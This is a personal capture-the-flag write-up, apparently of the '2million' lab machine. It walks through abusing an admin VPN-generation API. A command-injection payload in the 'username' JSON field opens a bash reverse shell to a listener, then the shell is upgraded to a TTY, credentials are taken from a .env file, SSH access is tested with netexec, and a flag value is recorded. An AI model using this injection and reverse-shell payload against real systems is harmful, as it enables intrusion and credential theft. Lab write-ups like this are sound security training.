now that we have an `admin` user we should be able to generate a `VPN` for the admin
![[Pasted image 20250418200240.png]]

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
```
submitting nothing in the firled when testing provides nothing
![[Pasted image 20250418200642.png]]
need to add a `username` to generate for

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive

{
  "username": "test"
}
```
now we get an `error` of `invalid content type` again
![[Pasted image 20250418200753.png]]
so same thing as before - copy and paste the `content type` from the `response` which was `application/json`

```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
Content-Length: 26
Content-Type: application/json

{
  "username": "test"
}
```
now we get `certificates` but dont have anything to do with them, since we now have the `username` feld lets try `command injection`
![[Pasted image 20250418201335.png]]
was able to get a `reverse shell` with this
```http
POST /api/v1/admin/vpn/generate HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://2million.htb/home/access
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=jmfes0rti5g4lmau3vesfhp6fk
Connection: keep-alive
Content-Length: 86
Content-Type: application/json

{
  "username": "test$(/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.208/1337 0>&1')"
}
```
but its not a proper `tty` 
![[Pasted image 20250418202614.png]]
need to get a `proper TTY` with this script
```bash
script /dev/null -c /bin/bash
CTRL + Z
stty raw -echo; fg
reset
Terminal type? screen
```
and now i have a proper `tty`
![[Pasted image 20250418202737.png]]
listing directories
![[Pasted image 20250418202837.png]]
in the `.env` file we find `admin` credentials
![[Pasted image 20250418203010.png]]
testing `credentials` with `netexec`
```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[19Apr2025 00:31:42]-[/var/www/html/portal]
â””â”€# netexec ssh 10.10.11.221 -u admin -p SuperDuperPass123
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder protocols
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing LDAP protocol database
[*] Initializing SSH protocol database
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing FTP protocol database
[*] Initializing WMI protocol database
[*] Initializing SMB protocol database
[*] Initializing RDP protocol database
[*] Initializing NFS protocol database
[*] Copying default configuration file
SSH         10.10.11.221    22     10.10.11.221     [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1
SSH         10.10.11.221    22     10.10.11.221     [+] admin:SuperDuperPass123  Linux - Shell access!
```
now can `ssh` right in
![[Pasted image 20250418203133.png]]
got the `first` flag - d63609f9fbfee94990c55ca406f2482a
![[Pasted image 20250418203319.png]]
![[Pasted image 20250418203355.png]]